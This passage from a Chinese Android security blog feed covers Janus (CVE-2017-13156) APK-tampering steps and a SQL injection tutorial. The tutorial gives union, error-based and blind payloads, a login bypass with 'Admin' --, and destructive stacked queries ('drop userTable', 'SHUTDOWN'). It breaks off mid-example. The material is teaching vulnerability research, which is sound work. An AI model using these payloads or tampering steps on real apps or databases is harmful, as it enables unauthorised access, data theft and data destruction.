class="variable">canonicalPath</span> <span class="operator">=</span> f.getCanonicalPath();</span><br><span class="line">  <span class="keyword">if</span> (!canonicalPath.startsWith(DIR)) &#123;</span><br><span class="line">    <span class="comment">// SecurityException</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Finish unzipping…</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六、Janus漏洞分析和复现"><a href="#六、Janus漏洞分析和复现" class="headerlink" title="六、Janus漏洞分析和复现"></a>六、Janus漏洞分析和复现</h2><p>我们上面已经介绍了签名相关的漏洞、和Zip相关的漏洞，下面我们拿2017年的典型漏洞Janus漏洞进行说明，这个漏洞结合了签名和Zip、dex的原理</p><h3 id="1-原理分析-1"><a href="#1-原理分析-1" class="headerlink" title="1.原理分析"></a>1.原理分析</h3><p>相信Janus漏洞原理大家已经十分熟悉了，作为2017年比较重大的Android漏洞，已经有不少的人对其进行了研究和复现，本节只是初步记录下Janus漏洞的学习过程和复现思路（Janus只针对v1签名，v2签名就无效了）</p><p>Android  ART虚拟机在加载并执行一个文件时，会首先判断这个文件的类型。如果这个文件是一个Dex文件，则按Dex的格式加载执行，如果是一个APK文件，则先抽取APK中的dex文件，然后再执行。而判断的依据是通过文件的头部魔术字（Magic Code）来判断。如果文件的头部魔术字是“dex”则判定该文件为Dex文件，如果文件头部的魔术字是“PK”则判定该文件为Apk文件</p><p>然而Android在安装一个APK时会对APK进行签名校验，但却直接默认该APK就是一个Zip文件（并不检查文件头的魔术字），而ZIP格式的文件一般都是从尾部先读取，因此只要ZIP文件尾部的数据结构没有被破坏，并且在读取过程中只要没有碰到非正常的数据，那么整个读取就不会有任何问题</p><p>因此，Android在加载执行代码时，<strong>只认文件头，而安装签名时只认文件尾</strong></p><p>这样我们构造一个APK<strong>，从其头部看是一个Dex文件，从其尾部看，是一个APK文件</strong>，就可以实施攻击。因此Janus漏洞便是将原APK中的classes.dex抽取出来，改造或替换成攻击者想要执行的dex，并将这个dex和原APK文件拼起来，合成一个文件</p><p>当然我们在构造apk时，还需要修改dex文件的字段和zip文件的字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dex文件修改DexHeader中的file_size，将其调整为合并后文件的大小</span><br><span class="line">zip文件修改尾部Zip,修正[end of central directory record]中[central directory]的偏移和[central directory]中各[local file header]的偏移</span><br></pre></td></tr></table></figure><p>漏洞攻击步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 从设备上取出目标应用的APK文件，并构造用于攻击的DEX文件；</span><br><span class="line">2. 将攻击DEX文件与原APK文件简单拼接为一个新的文件；</span><br><span class="line">3. 修复这个合并后的新文件的ZIP格式部分和DEX格式部分，修复原理如图1所示，需要修复文件格式中的关键偏移值和数据长度值；</span><br><span class="line">最后，将修复后的文件，重命名为APK文件，覆盖安装设备上的原应用即可</span><br></pre></td></tr></table></figure><h3 id="2-漏洞复现-1"><a href="#2-漏洞复现-1" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h3><p>实验样本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app-release.apk v1签名的初始样本</span><br><span class="line">classes.dex 修改后的dex文件</span><br><span class="line">out.apk 拼接后的apk文件</span><br><span class="line">janus.py 漏洞拼接代码</span><br></pre></td></tr></table></figure><p>首先，我们通过Android Studio编写apk文件，并通过v1签名生成</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/42.png" alt="image-20220221160839695"></p><p>我们在Bulid—&gt;Generate Signed APK中选择通过v1签名来生成apk文件</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/46.png" alt="image-20220221160944398"></p><p>我们便得到了app-release.apk文件，我们再通过AndroidKiller去修改源文件的代码，然后重新打包</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/44.png" alt="image-20220221161347673"></p><p>然后我们提取出生成的apk文件中的classes.dex文件</p><p>我们是使用<a href="https://github.com/V-E-O/PoC/blob/master/CVE-2017-13156/janus.py">Janus.py python2版本</a> 和<a href="https://github.com/xyzAsian/Janus-CVE-2017-13156">java版本</a>，这里我们使用Python版本</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/45.png" alt="image-20220221161702364"></p><p>我们就得到拼接的out.apk，我们只需要将这个apk去覆盖原始的apk即可</p><p>问题：</p><p>在尝试了几台Android 6.0的机子后，并未成功复现漏洞，最后推断很大程度是Android 系统打了补丁，所以要复现成功可能只能在未打补丁的系统上才行，不过整体来说是一次很好的学习经历</p><h3 id="3-安全防护-1"><a href="#3-安全防护-1" class="headerlink" title="3.安全防护"></a>3.安全防护</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android7.0后采用了v2签名机制可以有效的抵制Janus漏洞</span><br><span class="line">现在大部分的手机系统已经打上了Janus漏洞的补丁</span><br></pre></td></tr></table></figure><h2 id="七、实验总结"><a href="#七、实验总结" class="headerlink" title="七、实验总结"></a>七、实验总结</h2><p>本文对插件化和解压缩漏洞进行了详细的讲解和漏洞复现，在漏洞复现的过程中，我们发现一个漏洞复现的环境十分重要，因为很多时候曾经的一些典型漏洞都被打了补丁，很难在当下情况复现，当然我们应该更加注重漏洞的原理，从而进行学习，本文可能还存在一些不足之处就请各位大佬指教了。</p><p>本文的相关实验文件存放在知识星球中，本系列的实验文件后面也会逐一上传到知识星球。</p><h2 id="八、参考文献"><a href="#八、参考文献" class="headerlink" title="八、参考文献"></a>八、参考文献</h2><p>dex文件结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://juejin.cn/post/6844903847647772686</span><br><span class="line">https://www.jianshu.com/p/b79c729f326b</span><br><span class="line">https://www.jianshu.com/p/f7f0a712ddfe</span><br></pre></td></tr></table></figure><p>zip文件结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sina.com.cn/s/blog_4c3591bd0100zzm6.html</span><br><span class="line">https://thismj.cn/2019/02/14/qian-xi-zip-ge-shi/</span><br></pre></td></tr></table></figure><p>Android APK签名机制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://jishuin.proginn.com/p/763bfbd56b8b</span><br><span class="line">https://www.jianshu.com/p/286d2b372334</span><br><span class="line">https://xuanxuanblingbling.github.io/ctf/android/2018/12/30/signature/</span><br></pre></td></tr></table></figure><p>插件化漏洞原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/goodhacker/p/5152952.html</span><br><span class="line">https://wooyun.js.org/drops/APK%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87.html</span><br><span class="line">https://www.freebuf.com/articles/network/273466.html</span><br><span class="line">https://www.jianshu.com/p/14719d3a508f</span><br><span class="line">https://fiissh.tech/2021/android-fix-zip-path-traversal-vulnerability.html</span><br></pre></td></tr></table></figure><p>Janus漏洞原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://bbs.pediy.com/thread-223539.htm</span><br><span class="line">https://github.com/tea9/CVE-2017-13156-Janus</span><br><span class="line">https://cert.360.cn/warning/detail?id=d5a609929388cfd84c7e9aa8fb943265</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;最近一直处于忙碌的状态，花了很长一段时间，抽出碎片时间才将这篇帖子写完，本文结合上文的动态加载文章一起学习，本文主要讲述Android中存在的插件化漏洞、签名机制漏洞、解压缩漏洞等，并对一些经典的漏洞进行了复现，本文的相关实验文件由于太多，后面都会上传到知识星球&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（18）——Sql漏洞初探</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0018/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0018/</id>
    <published>2023-02-14T01:06:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近一直很忙碌，即将进入本系列文章基础篇的最后几个篇章，本文主要讲述Android中存在的常见的SQL注入漏洞的方式，以及如何快速的挖掘SQL注入漏洞。</p><span id="more"></span><p>本文结构如下：</p><p>第二节讲述SQL注入的基本原理</p><p>第三节讲述常见的SQL注入漏洞并复现</p><p>第四节讲述Content Provider上的sql注入漏洞</p><p>第五节讲述DownProvider 上的sql注入漏洞</p><h2 id="二、SQL漏洞原理介绍"><a href="#二、SQL漏洞原理介绍" class="headerlink" title="二、SQL漏洞原理介绍"></a>二、SQL漏洞原理介绍</h2><h3 id="1-SQL注入原理"><a href="#1-SQL注入原理" class="headerlink" title="1.SQL注入原理"></a>1.SQL注入原理</h3><p>通过实施 SQL 注入，攻击者可以获得对应用程序或数据库的完全访问权限，从而可以不负责任地删除或更改重要数据。未正确验证用户输入的应用程序使它们容易受到 SQL 注入的攻击。 SQL 注入攻击 (SQLIA) 发生在攻击者能够通过操纵用户输入数据将一系列恶意 SQL 语句插入“查询”以供后端数据库执行时。使用这种类型的威胁，应用程序可以很容易地被黑客入侵并被攻击者窃取机密数据。</p><p>SQL攻击的原理图如下所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/0.png" alt="image-20220707092239296"></p><p>上图中攻击者将 SQL 语句添加到应用程序表单输入框中，以访问资源或更改存储在数据库中的数据。应用程序中缺少输入验证会导致攻击者成功。在 SQL 注入攻击中，攻击者通过应用程序注入字符串输入，从而改变或操纵 SQL 语句以使攻击者受益。</p><h3 id="2-SQL注入分类"><a href="#2-SQL注入分类" class="headerlink" title="2.SQL注入分类"></a>2.SQL注入分类</h3><p>要学习SQL注入在Android上的使用，首先需要了解SQL注入的种类，SQL注入一般分为两种情况：<code>有回显和无回显</code>，有回显是指SQL语句返回的内容有显示在页面中；无回显是页面输出的内容并不是SQL语句返回的内容，而是“真”和“假”。</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/1.png" alt="image-20220707093229055"></p><h4 id="（1）联合查询注入"><a href="#（1）联合查询注入" class="headerlink" title="（1）联合查询注入"></a>（1）联合查询注入</h4><p>联合查询注入是在原有的查询条件下，通过union拼接上select语句，union可以用于合并两个和多个select语句的结果集</p><p>当union之前的select语句结果集为空时，查询结果将由union后的select语句控制。</p><p>联合查询语句构造步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.order by判断原有查询语句的列数</span><br><span class="line">2.使原有查询语句的结果为空</span><br><span class="line">3.判断数据输出位置</span><br><span class="line">4.使用union语句拼接目标数据的查询语句</span><br></pre></td></tr></table></figure><p>对于页面有回显，通常使用联合查询注入，可以快速爆出数据</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">order by <span class="comment">//确定列数</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">//显示回显位</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,database(),user() <span class="comment">//通过回显位爆出内容</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) from information_schema.schemata <span class="comment">//爆库</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() <span class="comment">//爆表</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;表名&#x27;</span> and table_schema=database() <span class="comment">//爆列</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(列名) from 表名 <span class="comment">//爆值</span></span><br></pre></td></tr></table></figure><h4 id="（2）报错注入"><a href="#（2）报错注入" class="headerlink" title="（2）报错注入"></a>（2）报错注入</h4><p>报错注入经过构造的函数，让函数处理<code>user()</code>等不合规定的数据，引发mysql报错；几乎任何与数据库有关的操作经过sql拼接都可以产生报错注入；当执行的SQL语句出错时返回错误信息，在错误信息中返回数据库的内容</p><p>构造报错注入的语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>构造目标数据查询语句</span><br><span class="line"><span class="number">2.</span>选择报错注入函数</span><br><span class="line"><span class="number">3.</span>构造报错注入语句</span><br><span class="line"><span class="number">4.</span>拼接报错注入语句</span><br><span class="line">常见的报错注入函数：floor()、extractvalue()、updatexml()等</span><br></pre></td></tr></table></figure><p>报错注入一般使用在查询不回显数据，但会打印错误信息的页面中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select <span class="title function_">user</span><span class="params">()</span>),<span class="number">0x7e</span>)) <span class="comment">//extractvalue报错将输出的字符长度限制为32位</span></span><br><span class="line"></span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select <span class="title function_">database</span><span class="params">()</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">//updatexml报错将输出的字符长度限制为32位</span></span><br><span class="line"></span><br><span class="line">select <span class="title function_">count</span><span class="params">(\*)</span> from information_schema.tables GROUP BY <span class="title function_">concat</span><span class="params">((select database()</span>),floor(rand(<span class="number">0</span>)\*<span class="number">2</span>)) <span class="comment">//floor报错将输出字符长度限制为64个字符</span></span><br></pre></td></tr></table></figure><h4 id="（3）布尔盲注"><a href="#（3）布尔盲注" class="headerlink" title="（3）布尔盲注"></a>（3）布尔盲注</h4><p>布尔盲注以页面回显内容的不同作为判定依据，通过构造语句返回页面的“真”和“假”来判断数据库信息的正确性</p><p>布尔盲注提取数据的基本步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>构造目标数据查询语句</span><br><span class="line"><span class="number">2.</span>选择拼接方式</span><br><span class="line"><span class="number">3.</span>构造判断表达式</span><br><span class="line"><span class="number">4.</span>提取数据长度</span><br><span class="line"><span class="number">5.</span>提取数据内容</span><br><span class="line">常见的拼接方式：原始条件真 and 判断条件真，原始条件假 or 判断条件真等</span><br></pre></td></tr></table></figure><p>若网页设置了无报错信息返回，在不回显数据+不返回报错信息的情况下，只剩下盲注方法可用，而布尔盲注使用在对真&#x2F;假条件的返回内容很容易区分的页面中。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">length(database()) <span class="comment">//判断数据库名长度</span></span><br><span class="line"></span><br><span class="line">ascii(substr((database()),s,<span class="number">1</span>))=可用ASCII码值 <span class="comment">//从数据库库名第s位开始，截取一位，进行逐一猜解；数据库库、表、字段所有名称的可用字符范围为A-Z、a-z、0-9和下划线，也就是ASCII码值从48到122</span></span><br><span class="line"></span><br><span class="line">length((select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>)) <span class="comment">//判断数据库中的第4个表表名长度，第1个表从0开始</span></span><br><span class="line"></span><br><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>),s,<span class="number">1</span>))=可用ASCII码值 <span class="comment">//逐一猜解第4个表的表名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//之后逐一猜解列名与数据</span></span><br></pre></td></tr></table></figure><h4 id="（4）时间盲注"><a href="#（4）时间盲注" class="headerlink" title="（4）时间盲注"></a>（4）时间盲注</h4><p>时间盲注通过构造语句，通过页面响应的时长来判断信息；时间盲注的关键点在于if()函数，通过条件语句进行判断，为真则立即执行，否则延时执行，通常使用sleep()等专用的延时函数来进行延时操作</p><p>时间盲注与布尔盲注的语句构造过程相似，通常在布尔盲注表达式的基础上使用if函数加入延时语句来构造。通常情况下，盲注需要逐个字符进行判断，极大增加了时间成本，而对于时间盲注来说，还需要额外的延迟时间来作为判断的标准</p><p>在布尔盲注永假条件所返回的内容与正常语句返回的内容很接近或相同，无法判断的情况下，可使用时间盲注</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sleep() <span class="comment">//使用延时函数进行判断</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(length(database())=数字,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//if()函数判断数据库长度，if(Condition,A,B)，当Condition为true时返回A，当Condition为false时返回B</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ascii(substr(database(),s,<span class="number">1</span>))=可用ASCII码值,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//使用if函数，从第S位开始截取一位，逐一猜解数据库名，可用ASCII码值范围为48-122</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(length(select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>)=数字,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//逐一猜解数据库第4个表长度，第1个表从0开始</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>),s,<span class="number">1</span>))=可用ASCII码值,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//逐一猜解数据库第4个表表名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//逐一猜解列名、数据</span></span><br></pre></td></tr></table></figure><p>SQL注入的常见分类如上所述，由于本文主要针对Android上SQL注入讲解，这里就不再深入研究，这里引用博客：<a href="https://www.modb.pro/db/163732">SQL注入漏洞分析</a>，要深入了解朋友可以看原作者博客，里面还有一些案例讲解。</p><h3 id="3-SQL常见注入技巧"><a href="#3-SQL常见注入技巧" class="headerlink" title="3.SQL常见注入技巧"></a>3.SQL常见注入技巧</h3><p>前面我们已经了解了SQL注入的基本分类，下面我们介绍一些SQL注入实际的测试技巧：</p><h4 id="（1）重言式攻击"><a href="#（1）重言式攻击" class="headerlink" title="（1）重言式攻击"></a>（1）重言式攻击</h4><p>重言式攻击通过一个或多个条件SQL语句查询注入代码，使SQL命令计算为真条件，如(1&#x3D;1)或（–）。一般可以用来绕过身份验证</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from table <span class="type">where</span> <span class="variable">table_ID</span> <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> or <span class="string">&#x27;1=1&#x27;</span>--<span class="string">&#x27;AND table_password=&#x27;</span><span class="number">1234</span><span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><h4 id="（2）Piggy-backed查询"><a href="#（2）Piggy-backed查询" class="headerlink" title="（2）Piggy-backed查询"></a>（2）Piggy-backed查询</h4><p>Piggy-backed Queries是一种攻击，它使用查询分隔符（如“；”）向原始查询注入额外的查询语句，从而危及数据库。 在这种方法中，第一个查询是原始的，而随后的查询是注入的。 这次攻击是非常危险的</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT pass FROM userTable WHEREuser_ld=<span class="string">&#x27;user1&quot; AND Password = 0; drop userTable</span></span><br></pre></td></tr></table></figure><h4 id="（3）逻辑错误"><a href="#（3）逻辑错误" class="headerlink" title="（3）逻辑错误"></a>（3）逻辑错误</h4><p>逻辑错误攻击利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM userTable WHEREuser_ld=’<span class="number">1111</span>’ AND password=<span class="string">&#x27;1234’ AND CONVERT(char, no)</span></span><br></pre></td></tr></table></figure><h4 id="（4）联合查询"><a href="#（4）联合查询" class="headerlink" title="（4）联合查询"></a>（4）联合查询</h4><p>联合查询注入称为语句注入攻击。 在此攻击中，攻击者在原始SQL语句中插入附加语句。 此攻击可以通过在Vulnerable参数中插入UNION查询或“；<SQL Statement>”形式的语句来完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT* FROM userTable WHEREuser_ld=<span class="number">1111</span><span class="string">&#x27;UNION SELECT *FROMmemberTable WHERE member_ld=&#x27;</span>admin<span class="string">&#x27;--&#x27;</span> AND password=<span class="string">&#x27;1234&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="（5）存储过程"><a href="#（5）存储过程" class="headerlink" title="（5）存储过程"></a>（5）存储过程</h4><p>在该技术中，攻击者主要关注数据库系统中存在的存储过程。 存储过程直接由数据库引擎运行。 它是一段可利用的代码。 存储过程为授权或未经授权的客户端提供true或false值。 对于SQLIA，攻击者将写入“； 关机； –“使用登录名或密钥。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Username FROM UserTableWHEREuser_name= <span class="string">&quot;user1&quot;</span> AND pass=<span class="string">&quot; &quot;</span>; SHUTDOWN;</span><br></pre></td></tr></table></figure><h4 id="（6）推断攻击"><a href="#（6）推断攻击" class="headerlink" title="（6）推断攻击"></a>（6）推断攻击</h4><p>利用推断攻击，攻击者可以改变数据库或应用程序的行为。 这种类型的攻击可以分为两种著名的技术，它们是：盲注入和定时攻击</p><h5 id="lt-1-gt-盲注入"><a href="#lt-1-gt-盲注入" class="headerlink" title="&lt;1&gt;盲注入"></a>&lt;1&gt;盲注入</h5><p>当程序员忘记隐藏导致数据库应用程序不安全的错误消息时，就会发生这种类型的SQLIA，这种错误消息通过SQL语句询问一系列逻辑问题来帮助SQLIA危及数据库。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT pass FROM userTable WHERE username=<span class="string">&#x27;user&#x27;</span> and <span class="number">1</span> =<span class="number">0</span> -- <span class="type">AND</span> <span class="variable">pass</span> <span class="operator">=</span> AND pin= <span class="number">0</span></span><br><span class="line">SELECT info FROM userTable WHERE username=<span class="string">&#x27;user&#x27;</span> and = <span class="number">1</span> -- <span class="type">AND</span> <span class="variable">pass</span> <span class="operator">=</span> AND pass= <span class="number">0</span></span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-定时攻击"><a href="#lt-2-gt-定时攻击" class="headerlink" title="&lt;2&gt;定时攻击"></a>&lt;2&gt;定时攻击</h5><p>这种类型的攻击允许攻击者通过观察数据库响应中的定时延迟来从数据库中收集信息。 这类攻击利用if条件语句来达到延时的目的。 WAITFOR是分支上的关键字，它导致数据库将其响应延迟指定的时间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @ varchar (<span class="number">8000</span>) select <span class="meta">@s</span> =db_name (<span class="keyword">if</span> (ascii (substring (<span class="meta">@s</span>,<span class="number">1</span>,<span class="number">1</span>))&amp;(power (<span class="number">2</span>,o) &gt; o waitfor delay <span class="string">&#x27;0:0:5&quot;</span></span><br></pre></td></tr></table></figure><h4 id="（7）交替编码"><a href="#（7）交替编码" class="headerlink" title="（7）交替编码"></a>（7）交替编码</h4><p>当攻击者通过使用替代编码（如十六进制、ASCII和Unicode）修改注入查询时，就会发生此类攻击。 通过这种方式，攻击者可以逃离开发人员的过滤器，该过滤器扫描输入查询以查找特定的已知“坏字符”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT accounts FROM userTable WHERE login=<span class="string">&quot;AND pin=0; exec (char(0x73687574646f776e)</span></span><br></pre></td></tr></table></figure><h3 id="4-Andorid-APP-SQL漏洞常见的测试点"><a href="#4-Andorid-APP-SQL漏洞常见的测试点" class="headerlink" title="4.Andorid APP SQL漏洞常见的测试点"></a>4.Andorid APP SQL漏洞常见的测试点</h3><p>Android APP SQL注入漏洞一般位于APP的用户登录，充值页面，修改银行卡，提交留言反馈，商品购买，提现功能等地方</p><h2 id="三、常见的SQL漏洞"><a href="#三、常见的SQL漏洞" class="headerlink" title="三、常见的SQL漏洞"></a>三、常见的SQL漏洞</h2><p>这里我们使用一个漏洞样本来详细的讲解APP SQL注入漏洞的情况</p><h3 id="1-重言式攻击"><a href="#1-重言式攻击" class="headerlink" title="1.重言式攻击"></a>1.重言式攻击</h3><h4 id="（1）漏洞原理"><a href="#（1）漏洞原理" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>我们前面讲了，可以使用<code>(1=1)或（--）</code>来绕过身份验证，我们知道一般SQL语句登录构造如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * From 用户表 Where UserName=xxx and Password=xxx</span><br></pre></td></tr></table></figure><p>然后判断返回的行数，如果有返回行，证明账号和密码是正确的，即登录成功，而这样的语句的话</p><p>那么我们可以在登录账户或密码后面加上<code>（1=1）</code>，因为1&#x3D;1登录条件永远成立，而<code>--</code>作为内嵌评论的开始字符，会导致后面内容只作为评论，这样就可以不去验证密码的有效性</p><h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>我们打开应用</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/2.png" alt="image-20220710153441324"></p><p>这里很显然是一个登录界面，APP会通过用户输入的账号和密码，去查询数据库中用户进行匹配，我们进一步进行静态分析</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/3.png" alt="image-20220710153652015"></p><p>不难找到这句语句是APP进行数据库查询的语句，我们可以进行进一步分析</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/4.png" alt="image-20220710153916860"></p><p>不难发现这里我们如果在不知道密码情况下，随意输入，APP会根据账号和密码构造一个有效的负载来避免检测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; WHERE NAME=&#x27;&quot; <span class="operator">+</span> username <span class="operator">+</span> &quot;&#x27; AND PASSWORD=&#x27;&quot; <span class="operator">+</span> password <span class="operator">+</span> &quot;&#x27;&quot;</span><br></pre></td></tr></table></figure><p>因此我们可以使用<code>（1=1）</code>和<code>--</code>两种方式来进行sql注入绕过验证</p><p><code>--</code></p><p>我们使用<code>--</code>来构造语句，无非是使得不会去检测密码的有效性，所以我们可以构造语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span> <span class="comment">-- AND PASSWORD = 